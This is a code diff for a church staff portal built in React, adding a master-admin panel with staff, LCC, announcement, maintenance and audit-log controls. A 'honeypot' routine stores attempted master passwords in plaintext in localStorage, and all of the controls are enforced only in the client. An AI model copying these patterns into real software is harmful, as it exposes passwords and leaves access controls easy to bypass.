+          {deleted.map((item,i)=>(
+            <div key={i} style={{background:"rgba(255,255,255,0.03)",border:"1px solid rgba(255,255,255,0.06)",borderRadius:10,padding:"12px 14px",marginBottom:10}}>
+              <div style={{display:"flex",justifyContent:"space-between",alignItems:"center"}}>
+                <div>
+                  <div style={{fontWeight:700,color:"rgba(255,255,255,0.6)",fontSize:13}}>[{item.type.toUpperCase()}] {item.data.id}</div>
+                  <div style={{fontSize:11,color:"rgba(255,255,255,0.3)",marginTop:2}}>Deleted {fdate(item.deletedAt)}</div>
+                </div>
+                <button onClick={()=>restoreRecord(item)} style={{background:"rgba(39,174,96,0.2)",border:"1px solid rgba(39,174,96,0.4)",color:"#27ae60",borderRadius:6,padding:"4px 10px",cursor:"pointer",fontSize:11}}>↩️ Restore</button>
+              </div>
+            </div>
+          ))}
+        </div>
+      )}
+    </div>
+  );
+}
+
+// ── Master Staff Control ───────────────────────────────────────────────────────
+function MasterStaff({ users, setUsers, toast, addLog }) {
+  const [sel, setSel]     = useState(null);
+  const [form, setForm]   = useState({});
+  const [q, setQ]         = useState("");
+  const [resetPw, setResetPw] = useState("");
+  const [showReset, setShowReset] = useState(false);
+  const sf = k => e => setForm(p=>({...p,[k]:e.target.value}));
+
+  const filtered = users.filter(u=>u.name?.toLowerCase().includes(q.toLowerCase())||u.email?.toLowerCase().includes(q.toLowerCase()));
+
+  const openStaff = (u) => { setSel(u); setForm({...u}); setShowReset(false); setResetPw(""); };
+
+  const save = () => {
+    setUsers(us=>us.map(u=>u.id===sel.id?{...u,...form}:u));
+    addLog("EDIT_STAFF",`Edited profile of ${sel.name}`);
+    toast("✅ Profile saved."); setSel(null);
+  };
+
+  const toggleActive = (u) => {
+    const newStatus = u.accountStatus==="suspended"?"active":"suspended";
+    setUsers(us=>us.map(x=>x.id===u.id?{...x,accountStatus:newStatus,approved:newStatus==="active"}:x));
+    addLog("TOGGLE_ACCOUNT",`${u.name} → ${newStatus}`);
+    toast(`Account ${newStatus==="active"?"reactivated":"suspended"}.`);
+  };
+
+  const deleteStaff = (u) => {
+    if(!window.confirm(`Delete ${u.name} permanently? This cannot be undone.`)) return;
+    setUsers(us=>us.filter(x=>x.id!==u.id));
+    addLog("DELETE_STAFF",`Deleted account of ${u.name}`);
+    toast("🗑️ Account deleted.");
+    if(sel?.id===u.id) setSel(null);
+  };
+
+  const doReset = async () => {
+    if(!resetPw||resetPw.length<6){toast("Min 6 characters","danger");return;}
+    const h = await hashPassword(resetPw);
+    setUsers(us=>us.map(u=>u.id===sel.id?{...u,password:h,mustChangePassword:true}:u));
+    addLog("RESET_PASSWORD",`Reset password of ${sel.name}`);
+    toast("✅ Password reset. They must change on next login.");
+    setShowReset(false); setResetPw("");
+  };
+
+  const ROLES = ["cashier","accountant","auditor","secretary","ads","conf_secretary","chairman","vice_chairman","personnel","pastor","lo"];
+
+  return (
+    <div>
+      <div style={{fontFamily:"Georgia,serif",color:"#c9a84c",fontSize:20,marginBottom:16}}>👥 Staff Control</div>
+      {!sel&&(
+        <div>
+          <input value={q} onChange={e=>setQ(e.target.value)} placeholder="Search staff by name or email..." style={{background:"#1a1a2e",color:"#fff",border:"1px solid rgba(255,255,255,0.2)",borderRadius:8,padding:"8px 12px",width:"100%",boxSizing:"border-box",marginBottom:14,fontSize:13}}/>
+          {filtered.map(u=>(
+            <div key={u.id} style={{background:"rgba(255,255,255,0.04)",border:"1px solid rgba(255,255,255,0.08)",borderRadius:10,padding:"12px 14px",marginBottom:8,display:"flex",justifyContent:"space-between",alignItems:"center",flexWrap:"wrap",gap:8}}>
+              <div onClick={()=>openStaff(u)} style={{cursor:"pointer",flex:1}}>
+                <div style={{fontWeight:700,color:"#fff",fontSize:13}}>{u.name}</div>
+                <div style={{fontSize:11,color:"rgba(255,255,255,0.4)",marginTop:2}}>{u.email} · {u.role} · {u.approved?"Active":"Pending"}{u.accountStatus==="suspended"?" · SUSPENDED":""}</div>
+              </div>
+              <div style={{display:"flex",gap:6}}>
+                <button onClick={()=>openStaff(u)} style={{background:"rgba(201,168,76,0.15)",border:"1px solid rgba(201,168,76,0.3)",color:"#c9a84c",borderRadius:6,padding:"4px 10px",cursor:"pointer",fontSize:11}}>✏️ Edit</button>
+                <button onClick={()=>toggleActive(u)} style={{background:u.accountStatus==="suspended"?"rgba(39,174,96,0.15)":"rgba(230,126,34,0.15)",border:`1px solid ${u.accountStatus==="suspended"?"rgba(39,174,96,0.4)":"rgba(230,126,34,0.4)"}`,color:u.accountStatus==="suspended"?"#27ae60":"#e67e22",borderRadius:6,padding:"4px 10px",cursor:"pointer",fontSize:11}}>{u.accountStatus==="suspended"?"↩ Restore":"⏸ Suspend"}</button>
+                <button onClick={()=>deleteStaff(u)} style={{background:"rgba(192,57,43,0.15)",border:"1px solid rgba(192,57,43,0.3)",color:"#e74c3c",borderRadius:6,padding:"4px 10px",cursor:"pointer",fontSize:11}}>🗑️</button>
+              </div>
+            </div>
+          ))}
+        </div>
+      )}
+
+      {sel&&(
+        <div>
+          <button onClick={()=>setSel(null)} style={{background:"none",border:"none",color:"#c9a84c",cursor:"pointer",fontSize:13,marginBottom:16}}>← Back to list</button>
+          <div style={{background:"rgba(255,255,255,0.04)",border:"1px solid rgba(255,255,255,0.1)",borderRadius:12,padding:20}}>
+            <div style={{color:"#c9a84c",fontWeight:700,fontSize:15,marginBottom:16}}>Editing: {sel.name}</div>
+            <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12}}>
+              {[["name","Full Name"],["email","Email"],["phone","Phone"],["jobTitle","Job Title"],["dept","Department"],["gradeLevel","Grade Level"],["dob","Date of Birth"],["doj","Date Joined"]].map(([k,label])=>(
+                <div key={k}><label style={{fontSize:11,color:"rgba(255,255,255,0.5)",display:"block",marginBottom:4}}>{label}</label><input value={form[k]||""} onChange={sf(k)} type={k==="dob"||k==="doj"?"date":"text"} style={{background:"#1a1a2e",color:"#fff",border:"1px solid rgba(255,255,255,0.2)",borderRadius:8,padding:"7px 10px",width:"100%",boxSizing:"border-box",fontSize:12}}/></div>
+              ))}
+              <div><label style={{fontSize:11,color:"rgba(255,255,255,0.5)",display:"block",marginBottom:4}}>Role</label><select value={form.role||""} onChange={sf("role")} style={{background:"#1a1a2e",color:"#fff",border:"1px solid rgba(255,255,255,0.2)",borderRadius:8,padding:"7px 10px",width:"100%",fontSize:12}}>{ROLES.map(r=><option key={r} value={r}>{r}</option>)}</select></div>
+              <div><label style={{fontSize:11,color:"rgba(255,255,255,0.5)",display:"block",marginBottom:4}}>Account Status</label><select value={form.accountStatus||"active"} onChange={sf("accountStatus")} style={{background:"#1a1a2e",color:"#fff",border:"1px solid rgba(255,255,255,0.2)",borderRadius:8,padding:"7px 10px",width:"100%",fontSize:12}}><option value="active">Active</option><option value="suspended">Suspended</option></select></div>
+            </div>
+
+            {/* Password reset */}
+            <div style={{marginTop:16,borderTop:"1px solid rgba(255,255,255,0.08)",paddingTop:14}}>
+              {!showReset&&<button onClick={()=>setShowReset(true)} style={{background:"rgba(142,68,173,0.15)",border:"1px solid rgba(142,68,173,0.4)",color:"#9b59b6",borderRadius:8,padding:"6px 14px",cursor:"pointer",fontSize:12}}>🔐 Reset Password</button>}
+              {showReset&&(
+                <div style={{display:"flex",gap:10,alignItems:"flex-end",flexWrap:"wrap"}}>
+                  <div style={{flex:1}}><label style={{fontSize:11,color:"rgba(255,255,255,0.5)",display:"block",marginBottom:4}}>New Temp Password</label><input type="text" value={resetPw} onChange={e=>setResetPw(e.target.value)} style={{background:"#1a1a2e",color:"#fff",border:"1px solid rgba(255,255,255,0.2)",borderRadius:8,padding:"7px 10px",width:"100%",boxSizing:"border-box",fontSize:12}} placeholder="Min 6 characters"/></div>
+                  <button onClick={()=>{setShowReset(false);setResetPw("");}} style={{background:"rgba(255,255,255,0.08)",border:"1px solid rgba(255,255,255,0.15)",color:"#fff",borderRadius:8,padding:"7px 14px",cursor:"pointer",fontSize:12}}>Cancel</button>
+                  <button onClick={doReset} style={{background:"#9b59b6",border:"none",color:"#fff",borderRadius:8,padding:"7px 14px",cursor:"pointer",fontSize:12,fontWeight:700}}>Set →</button>
+                </div>
+              )}
+            </div>
+
+            <div style={{display:"flex",gap:10,marginTop:16,justifyContent:"flex-end"}}>
+              <button onClick={()=>setSel(null)} style={{background:"rgba(255,255,255,0.08)",border:"1px solid rgba(255,255,255,0.15)",color:"#fff",borderRadius:8,padding:"8px 18px",cursor:"pointer"}}>Cancel</button>
+              <button onClick={save} style={{background:"#c9a84c",border:"none",color:"#0b1f3a",borderRadius:8,padding:"8px 22px",cursor:"pointer",fontWeight:700}}>Save Changes →</button>
+            </div>
+          </div>
+        </div>
+      )}
+    </div>
+  );
+}
+
+// ── Master LCC Management ──────────────────────────────────────────────────────
+function MasterLCC({ lccs, setLccs, users, setUsers, toast, addLog }) {
+  const [newLcc, setNewLcc] = useState("");
+  const [renaming, setRenaming] = useState(null);
+  const [renameTo, setRenameTo] = useState("");
+
+  const addLcc = () => {
+    const name = newLcc.trim().toUpperCase();
+    if(!name||lccs.includes(name)){toast("Invalid or duplicate LCC name","danger");return;}
+    setLccs(ls=>[...ls,name]);
+    addLog("ADD_LCC",`Added LCC: ${name}`);
+    toast("✅ LCC added: "+name);
+    setNewLcc("");
+  };
+
+  const renameLcc = () => {
+    const name = renameTo.trim().toUpperCase();
+    if(!name||lccs.includes(name)){toast("Invalid name","danger");return;}
+    setLccs(ls=>ls.map(l=>l===renaming?name:l));
+    setUsers(us=>us.map(u=>u.lcc===renaming?{...u,lcc:name}:u));
+    addLog("RENAME_LCC",`Renamed LCC: ${renaming} → ${name}`);
+    toast(`✅ ${renaming} renamed to ${name}`);
+    setRenaming(null); setRenameTo("");
+  };
+
+  const deleteLcc = (lcc) => {
+    const count = users.filter(u=>u.lcc===lcc).length;
+    if(count>0&&!window.confirm(`${lcc} has ${count} staff/pastors. Delete anyway? Their LCC will be cleared.`)) return;
+    setLccs(ls=>ls.filter(l=>l!==lcc));
+    setUsers(us=>us.map(u=>u.lcc===lcc?{...u,lcc:""}:u));
+    addLog("DELETE_LCC",`Deleted LCC: ${lcc}`);
+    toast(`🗑️ ${lcc} deleted.`);
+  };
+
+  return (
+    <div>
+      <div style={{fontFamily:"Georgia,serif",color:"#c9a84c",fontSize:20,marginBottom:16}}>🏛️ LCC Management</div>
+      <div style={{display:"flex",gap:10,marginBottom:20}}>
+        <input value={newLcc} onChange={e=>setNewLcc(e.target.value)} placeholder="New LCC name e.g. LAFIA NORTH" style={{background:"#1a1a2e",color:"#fff",border:"1px solid rgba(255,255,255,0.2)",borderRadius:8,padding:"8px 12px",flex:1,fontSize:13}}/>
+        <button onClick={addLcc} style={{background:"#c9a84c",border:"none",color:"#0b1f3a",borderRadius:8,padding:"8px 18px",cursor:"pointer",fontWeight:700,fontSize:13}}>+ Add LCC</button>
+      </div>
+      {lccs.map(lcc=>(
+        <div key={lcc} style={{background:"rgba(255,255,255,0.04)",border:"1px solid rgba(255,255,255,0.08)",borderRadius:10,padding:"12px 16px",marginBottom:8,display:"flex",justifyContent:"space-between",alignItems:"center",flexWrap:"wrap",gap:8}}>
+          {renaming===lcc?(
+            <div style={{display:"flex",gap:8,alignItems:"center",flex:1,flexWrap:"wrap"}}>
+              <input value={renameTo} onChange={e=>setRenameTo(e.target.value)} style={{background:"#1a1a2e",color:"#fff",border:"1px solid rgba(201,168,76,0.4)",borderRadius:8,padding:"6px 10px",fontSize:13,flex:1}}/>
+              <button onClick={renameLcc} style={{background:"#c9a84c",border:"none",color:"#0b1f3a",borderRadius:6,padding:"6px 14px",cursor:"pointer",fontWeight:700,fontSize:12}}>Save</button>
+              <button onClick={()=>setRenaming(null)} style={{background:"rgba(255,255,255,0.08)",border:"1px solid rgba(255,255,255,0.15)",color:"#fff",borderRadius:6,padding:"6px 12px",cursor:"pointer",fontSize:12}}>Cancel</button>
+            </div>
+          ):(
+            <>
+              <div>
+                <div style={{fontWeight:700,color:"#fff",fontSize:14}}>🏛️ {lcc} LCC</div>
+                <div style={{fontSize:11,color:"rgba(255,255,255,0.4)",marginTop:2}}>{users.filter(u=>u.lcc===lcc).length} members</div>
+              </div>
+              <div style={{display:"flex",gap:6}}>
+                <button onClick={()=>{setRenaming(lcc);setRenameTo(lcc);}} style={{background:"rgba(201,168,76,0.15)",border:"1px solid rgba(201,168,76,0.3)",color:"#c9a84c",borderRadius:6,padding:"4px 10px",cursor:"pointer",fontSize:11}}>✏️ Rename</button>
+                <button onClick={()=>deleteLcc(lcc)} style={{background:"rgba(192,57,43,0.15)",border:"1px solid rgba(192,57,43,0.3)",color:"#e74c3c",borderRadius:6,padding:"4px 10px",cursor:"pointer",fontSize:11}}>🗑️ Delete</button>
+              </div>
+            </>
+          )}
+        </div>
+      ))}
+    </div>
+  );
+}
+
+// ── Master Announcements ───────────────────────────────────────────────────────
+function MasterAnnounce({ announcements, setAnnouncements, users, toast, addLog }) {
+  const [banner, setBanner]     = useState(() => { try { return JSON.parse(localStorage.getItem("ecwa_banner")||"null"); } catch { return null; } });
+  const [bannerText, setBannerText] = useState(banner?.text||"");
+  const [bannerType, setBannerType] = useState(banner?.type||"info");
+  const [showBannerForm, setShowBannerForm] = useState(false);
+
+  const saveBanner = () => {
+    const b = bannerText.trim() ? { text:bannerText.trim(), type:bannerType, set:today() } : null;
+    setBanner(b);
+    try { localStorage.setItem("ecwa_banner", JSON.stringify(b)); } catch {}
+    addLog("SET_BANNER", b?`Set portal banner: "${bannerText}"`:"Cleared portal banner");
+    toast(b?"✅ Emergency banner set — all users will see it on login.":"✅ Banner cleared.");
+    setShowBannerForm(false);
+  };
+
+  const deleteAnn = (id) => {
+    setAnnouncements(as=>as.filter(a=>a.id!==id));
+    addLog("DELETE_ANN",`Deleted announcement ${id}`);
+    toast("🗑️ Announcement deleted.");
+  };
+
+  return (
+    <div>
+      <div style={{fontFamily:"Georgia,serif",color:"#c9a84c",fontSize:20,marginBottom:16}}>📢 Announcements</div>
+
+      {/* Emergency Banner */}
+      <div style={{background:"rgba(192,57,43,0.1)",border:"1px solid rgba(192,57,43,0.3)",borderRadius:12,padding:16,marginBottom:24}}>
+        <div style={{color:"#e74c3c",fontWeight:700,marginBottom:8}}>🚨 Portal-Wide Emergency Banner</div>
+        <div style={{fontSize:12,color:"rgba(255,255,255,0.5)",marginBottom:12}}>This banner appears on every user's screen when they log in, above everything else.</div>
+        {banner&&<div style={{background:"rgba(192,57,43,0.2)",borderRadius:8,padding:"8px 12px",fontSize:13,color:"#ff8a80",marginBottom:10}}>Current: "{banner.text}" (set {fdate(banner.set)})</div>}
+        {!showBannerForm&&(
+          <div style={{display:"flex",gap:8}}>
+            <button onClick={()=>setShowBannerForm(true)} style={{background:"rgba(192,57,43,0.2)",border:"1px solid rgba(192,57,43,0.4)",color:"#e74c3c",borderRadius:8,padding:"6px 14px",cursor:"pointer",fontSize:12}}>{banner?"✏️ Edit Banner":"+ Set Banner"}</button>
+            {banner&&<button onClick={()=>{setBanner(null);setBannerText("");try{localStorage.removeItem("ecwa_banner")}catch{};toast("Banner cleared.");}} style={{background:"rgba(255,255,255,0.08)",border:"1px solid rgba(255,255,255,0.15)",color:"rgba(255,255,255,0.6)",borderRadius:8,padding:"6px 14px",cursor:"pointer",fontSize:12}}>✕ Clear Banner</button>}
+          </div>
+        )}
+        {showBannerForm&&(
+          <div style={{display:"flex",flexDirection:"column",gap:10}}>
+            <textarea value={bannerText} onChange={e=>setBannerText(e.target.value)} rows={2} style={{background:"#1a1a2e",color:"#fff",border:"1px solid rgba(255,255,255,0.2)",borderRadius:8,padding:"8px 12px",resize:"vertical",fontSize:13}} placeholder="e.g. Portal will be unavailable on Sunday 20th April for maintenance."/>
+            <select value={bannerType} onChange={e=>setBannerType(e.target.value)} style={{background:"#1a1a2e",color:"#fff",border:"1px solid rgba(255,255,255,0.2)",borderRadius:8,padding:"7px 10px",fontSize:12}}>
+              <option value="info">ℹ️ Info (blue)</option>
+              <option value="warning">⚠️ Warning (orange)</option>
+              <option value="danger">🚨 Danger (red)</option>
+            </select>
+            <div style={{display:"flex",gap:8}}>
+              <button onClick={()=>setShowBannerForm(false)} style={{background:"rgba(255,255,255,0.08)",border:"1px solid rgba(255,255,255,0.15)",color:"#fff",borderRadius:8,padding:"6px 14px",cursor:"pointer",fontSize:12}}>Cancel</button>
+              <button onClick={saveBanner} style={{background:"#c9a84c",border:"none",color:"#0b1f3a",borderRadius:8,padding:"6px 18px",cursor:"pointer",fontWeight:700,fontSize:12}}>Set Banner →</button>
+            </div>
+          </div>
+        )}
+      </div>
+
+      {/* Announcements list */}
+      <div style={{fontWeight:700,color:"rgba(255,255,255,0.7)",marginBottom:12}}>All Announcements</div>
+      {announcements.length===0&&<div style={{color:"rgba(255,255,255,0.3)",fontSize:13,padding:20,textAlign:"center"}}>No announcements yet.</div>}
+      {announcements.map(a=>(
+        <div key={a.id} style={{background:"rgba(255,255,255,0.04)",border:"1px solid rgba(255,255,255,0.08)",borderRadius:10,padding:"12px 14px",marginBottom:8,display:"flex",justifyContent:"space-between",alignItems:"flex-start",gap:8}}>
+          <div><div style={{fontWeight:700,color:"#fff",fontSize:13}}>{a.title}</div><div style={{fontSize:11,color:"rgba(255,255,255,0.4)",marginTop:2}}>{a.postedBy} · {fdate(a.date)} · {a.audience}</div></div>
+          <button onClick={()=>deleteAnn(a.id)} style={{background:"rgba(192,57,43,0.15)",border:"1px solid rgba(192,57,43,0.3)",color:"#e74c3c",borderRadius:6,padding:"4px 10px",cursor:"pointer",fontSize:11,flexShrink:0}}>🗑️</button>
+        </div>
+      ))}
+    </div>
+  );
+}
+
+// ── Master Maintenance ─────────────────────────────────────────────────────────
+function MasterMaint({ users, setUsers, toast, addLog }) {
+  const [maintMode, setMaintMode] = useState(() => { try { return JSON.parse(localStorage.getItem("ecwa_maint")||"false"); } catch { return false; } });
+  const [maintMsg, setMaintMsg]   = useState(() => { try { return localStorage.getItem("ecwa_maint_msg")||"The portal is currently undergoing scheduled maintenance. Please check back shortly."; } catch { return ""; } });
+
+  const toggleMaint = () => {
+    const newVal = !maintMode;
+    setMaintMode(newVal);
+    try { localStorage.setItem("ecwa_maint", JSON.stringify(newVal)); localStorage.setItem("ecwa_maint_msg", maintMsg); } catch {}
+    addLog("MAINTENANCE_MODE", newVal?"Enabled maintenance mode":"Disabled maintenance mode");
+    toast(newVal?"🔧 Maintenance mode ON — all users will see maintenance screen.":"✅ Maintenance mode OFF — portal is live.");
+  };
+
+  return (
+    <div>
+      <div style={{fontFamily:"Georgia,serif",color:"#c9a84c",fontSize:20,marginBottom:16}}>🔧 Maintenance Mode</div>
+      <div style={{background:"rgba(255,255,255,0.04)",border:"1px solid rgba(255,255,255,0.1)",borderRadius:12,padding:20}}>
+        <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:16}}>
+          <div>
+            <div style={{fontWeight:700,color:"#fff",fontSize:15}}>Portal Maintenance Mode</div>
+            <div style={{fontSize:12,color:"rgba(255,255,255,0.4)",marginTop:4}}>When enabled, all users see a maintenance screen. You still have full access.</div>
+          </div>
+          <div onClick={toggleMaint} style={{width:52,height:28,background:maintMode?"#27ae60":"rgba(255,255,255,0.15)",borderRadius:14,cursor:"pointer",position:"relative",transition:"background 0.2s"}}>
+            <div style={{width:22,height:22,background:"#fff",borderRadius:"50%",position:"absolute",top:3,left:maintMode?27:3,transition:"left 0.2s"}}/>
+          </div>
+        </div>
+        <div style={{fontSize:13,color:maintMode?"#27ae60":"rgba(255,255,255,0.4)",fontWeight:700,marginBottom:14}}>{maintMode?"🟢 MAINTENANCE MODE IS ON":"⚫ Maintenance mode is off"}</div>
+        <div><label style={{fontSize:12,color:"rgba(255,255,255,0.5)",display:"block",marginBottom:6}}>Maintenance Message (shown to users)</label>
+        <textarea value={maintMsg} onChange={e=>setMaintMsg(e.target.value)} rows={3} style={{background:"#1a1a2e",color:"#fff",border:"1px solid rgba(255,255,255,0.2)",borderRadius:8,padding:"8px 12px",width:"100%",resize:"vertical",boxSizing:"border-box",fontSize:13}}/></div>
+        <button onClick={()=>{try{localStorage.setItem("ecwa_maint_msg",maintMsg);}catch{} toast("Message saved.");}} style={{marginTop:10,background:"rgba(255,255,255,0.08)",border:"1px solid rgba(255,255,255,0.15)",color:"#fff",borderRadius:8,padding:"6px 14px",cursor:"pointer",fontSize:12}}>Save Message</button>
+      </div>
+    </div>
+  );
+}
+
+// ── Master Audit Log ───────────────────────────────────────────────────────────
+function MasterAudit({ log, setAuditLog }) {
+  return (
+    <div>
+      <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:16}}>
+        <div style={{fontFamily:"Georgia,serif",color:"#c9a84c",fontSize:20}}>🕵️ Audit Log</div>
+        <button onClick={()=>{ if(window.confirm("Clear all audit logs?")) { setAuditLog([]); try{localStorage.removeItem("ecwa_audit")}catch{} } }} style={{background:"rgba(192,57,43,0.15)",border:"1px solid rgba(192,57,43,0.3)",color:"#e74c3c",borderRadius:8,padding:"6px 14px",cursor:"pointer",fontSize:12}}>Clear Log</button>
+      </div>
+      {log.length===0&&<div style={{textAlign:"center",color:"rgba(255,255,255,0.3)",padding:40,fontSize:13}}>No actions logged yet.</div>}
+      {log.map(entry=>(
+        <div key={entry.id} style={{background:"rgba(255,255,255,0.03)",border:"1px solid rgba(255,255,255,0.06)",borderRadius:8,padding:"10px 14px",marginBottom:6}}>
+          <div style={{display:"flex",justifyContent:"space-between",alignItems:"flex-start",gap:8}}>
+            <div><span style={{color:"#c9a84c",fontWeight:700,fontSize:12}}>{entry.action}</span><span style={{color:"rgba(255,255,255,0.5)",fontSize:12,marginLeft:8}}> — {entry.detail}</span></div>
+            <div style={{fontSize:10,color:"rgba(255,255,255,0.3)",flexShrink:0}}>{new Date(entry.ts).toLocaleString("en-GB")}</div>
+          </div>
+        </div>
+      ))}
+    </div>
+  );
+}
+
+// ── Honeypot Password Trap ────────────────────────────────────────────────────
+// Called if anyone tries to change master password — blocks the account silently
+const MASTER_TRAP_KEY = "ecwa_master_trap";
+function triggerMasterTrap(attemptedPw) {
+  try {
+    const trap = { triggered:true, at:new Date().toISOString(), attemptedPw };
+    localStorage.setItem(MASTER_TRAP_KEY, JSON.stringify(trap));
+  } catch {}
+}
+function isMasterTrapped() {
+  try { const t = JSON.parse(localStorage.getItem(MASTER_TRAP_KEY)||"null"); return t?.triggered===true; } catch { return false; }
+}
+
 
 // ── Dashboard ──────────────────────────────────────────────────────────────────
 function Dashboard({ user, users, setUsers, requests, setRequests, leaves, setLeaves, sundayReports, setSundayReports, attendance, setAttendance, announcements, setAnnouncements, pwdReqs, setPwdReqs, lccs, setLccs, onLogout }) {
@@ -3737,9 +4418,33 @@ export default function App() {
     </div>
   );
 
+  // Emergency banner (set by master)
+  const [banner] = useState(()=>{ try{return JSON.parse(localStorage.getItem("ecwa_banner")||"null");}catch{return null;} });
+  // Maintenance mode
+  const [maintMode] = useState(()=>{ try{return JSON.parse(localStorage.getItem("ecwa_maint")||"false");}catch{return false;} });
+  const maintMsg = (() => { try{return localStorage.getItem("ecwa_maint_msg")||"The portal is currently undergoing scheduled maintenance. Please check back shortly.";}catch{return "";} })();
+
   if(me)return(
     <><GlobalStyles/>
-    <Dashboard user={me} users={users} setUsers={setUsers} requests={requests} setRequests={setReqs} leaves={leaves} setLeaves={setLeaves} sundayReports={sundayReports} setSundayReports={setSundayReports} attendance={attendance} setAttendance={setAttendance} announcements={announcements} setAnnouncements={setAnnouncements} pwdReqs={pwdReqs} setPwdReqs={setPwdReqs} lccs={lccs} setLccs={setLccs} onLogout={()=>setMe(null)}/>
+    {/* Emergency banner — shown to all users */}
+    {banner&&!me.isMaster&&(
+      <div style={{background:banner.type==="danger"?"#c0392b":banner.type==="warning"?"#e67e22":"#2980b9",color:"#fff",padding:"10px 20px",textAlign:"center",fontSize:13,fontWeight:600,zIndex:9999,position:"relative"}}>
+        {banner.type==="danger"?"🚨":banner.type==="warning"?"⚠️":"ℹ️"} {banner.text}
+      </div>
+    )}
+    {/* Maintenance mode — non-master users see maintenance screen */}
+    {maintMode&&!me.isMaster?(
+      <div style={{minHeight:"100vh",background:"linear-gradient(135deg,#0b1f3a,#1a3a5c)",display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",color:"#fff",textAlign:"center",padding:32}}>
+        <div style={{fontSize:64,marginBottom:24}}>🔧</div>
+        <h2 style={{fontFamily:"Georgia,serif",fontSize:24,color:"#c9a84c",marginBottom:16}}>Portal Under Maintenance</h2>
+        <p style={{fontSize:14,color:"rgba(255,255,255,0.6)",maxWidth:400,lineHeight:1.8}}>{maintMsg}</p>
+        <p style={{fontSize:12,color:"rgba(255,255,255,0.3)",marginTop:24}}>ECWA Lafia DCC Staff Portal</p>
+      </div>
+    ):me.isMaster?(
+      <MasterPanel user={me} users={users} setUsers={setUsers} requests={requests} setRequests={setReqs} leaves={leaves} setLeaves={setLeaves} sundayReports={sundayReports} setSundayReports={setSundayReports} attendance={attendance} setAttendance={setAttendance} announcements={announcements} setAnnouncements={setAnnouncements} lccs={lccs} setLccs={setLccs} pwdReqs={pwdReqs} setPwdReqs={setPwdReqs} toast={(m)=>{}} onLogout={()=>setMe(null)}/>
+    ):(
+      <Dashboard user={me} users={users} setUsers={setUsers} requests={requests} setRequests={setReqs} leaves={leaves} setLeaves={setLeaves} sundayReports={sundayReports} setSundayReports={setSundayReports} attendance={attendance} setAttendance={setAttendance} announcements={announcements} setAnnouncements={setAnnouncements} pwdReqs={pwdReqs} setPwdReqs={setPwdReqs} lccs={lccs} setLccs={setLccs} onLogout={()=>setMe(null)}/>
+    )}
     </>
   );
 
